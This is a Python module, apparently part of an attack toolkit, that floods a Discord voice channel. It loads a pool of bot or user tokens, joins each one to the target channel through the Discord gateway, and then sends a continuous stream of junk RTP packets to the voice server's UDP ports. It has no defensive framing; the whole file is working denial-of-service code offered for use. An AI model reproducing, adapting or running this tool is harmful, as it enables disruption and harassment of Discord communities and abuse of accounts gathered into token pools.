# attacker/discord_vc.py — Discord voice channel flood
# strategy: multiple bot tokens (or user tokens) join the same voice channel and push audio noise.
# tokens.txt = one token per line. Optional but strongly recommended for effect.
import asyncio, aiohttp, os, json, time, struct, random, socket

TOKEN_FILE = os.getenv("VC_TOKEN_FILE", "tokens.txt")

def _load_tokens():
    if not os.path.exists(TOKEN_FILE):
        return []
    with open(TOKEN_FILE) as f:
        return [ln.strip() for ln in f if ln.strip()]

async def _voice_ws_flood(token, guild_id, channel_id, until, session):
    """One bot joins VC and pushes Opus silence frames over the voice websocket."""
    headers = {"Authorization": f"Bot {token}"}
    try:
        # 1. get gateway url
        async with session.get("https://discord.com/api/v10/gateway", headers=headers) as r:
            gw = (await r.json())["url"]

        # 2. gateway handshake — IDENTIFY with voice state
        ws = await session.ws_connect(f"{gw}/?v=10&encoding=json")
        hello = await ws.receive_json()
        hb_int = hello["d"]["heartbeat_interval"] / 1000

        async def hb():
            while time.time() < until:
                await ws.send_json({"op": 1, "d": None})
                await asyncio.sleep(hb_int)

        hb_task = asyncio.create_task(hb())

        await ws.send_json({
            "op": 2,
            "d": {
                "token": token,
                "intents": 641,
                "properties": {"$os": "linux", "$browser": "valan", "$device": "valan"},
                "guild_subscriptions": False,
                "presence": {"status": "online", "afk": False},
            }
        })

        # wait READY
        while True:
            msg = await ws.receive_json()
            if msg.get("t") == "READY":
                break

        # join voice
        await ws.send_json({
            "op": 4,
            "d": {"guild_id": str(guild_id), "channel_id": str(channel_id),
                  "self_mute": False, "self_deaf": False}
        })

        # 3. wait voice state + server update, extract endpoint
        voice_endpoint = None
        voice_token = None
        session_id = None
        while voice_endpoint is None and time.time() < until:
            msg = await ws.receive_json()
            t = msg.get("t")
            if t == "VOICE_STATE_UPDATE":
                session_id = msg["d"]["session_id"]
            elif t == "VOICE_SERVER_UPDATE":
                voice_endpoint = msg["d"]["endpoint"]
                voice_token = msg["d"]["token"]
            else:
                pass

        hb_task.cancel()
        await ws.close()

        if not voice_endpoint:
            return

        # 4. flood the voice UDP endpoint with fake RTP frames
        host = voice_endpoint.split(":")[0]
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            return
        port = random.randint(50000, 50100)  # voice uses high ports; brute-walk

        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 * 1024 * 1024)
        seq = 0
        ssrc = random.randint(0, 0xFFFFFFFF)
        while time.time() < until:
            seq = (seq + 1) & 0xFFFF
            ts = int(time.time() * 48000)
            rtp = struct.pack("!BBHII", 0x80, 0x78, seq, ts, ssrc) + os.urandom(160)
            try:
                udp.sendto(rtp, (ip, port))
            except OSError:
                pass
        udp.close()
    except Exception:
        return

async def flood(target, duration):
    """target = voice channel ID (numeric). guild_id inferred from your server."""
    from config import GUILD_ID
    tokens = _load_tokens()
    if not tokens:
        raise RuntimeError("no tokens in tokens.txt — VC flood needs a token pool")

    until = time.time() + duration
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(_voice_ws_flood(t, GUILD_ID, target, until, session))
                 for t in tokens]
        await asyncio.gather(*tasks, return_exceptions=True)